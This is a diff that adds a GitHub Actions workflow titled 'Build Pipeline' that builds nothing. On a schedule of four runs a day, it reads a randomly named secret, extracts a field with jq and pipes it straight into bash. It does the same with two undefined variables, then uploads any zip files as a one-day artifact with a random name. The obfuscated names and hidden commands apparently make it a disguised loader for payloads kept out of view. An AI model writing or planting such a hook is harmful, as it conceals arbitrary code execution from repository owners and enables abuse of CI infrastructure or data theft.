@@ -1,0 +1,28 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '52 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          rv72606: ${{ secrets.rv72606 }}
+        run: |
+          printf '%s' "$rv72606" | jq -r .ubhn96104 | /bin/bash
+          printf '%s' "$elo4" | jq -r .f1 | /bin/bash
+          echo $qff5 | jq -r .pjs993 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: wjt2N40o
+          path: "*.zip"
+          retention-days: 1
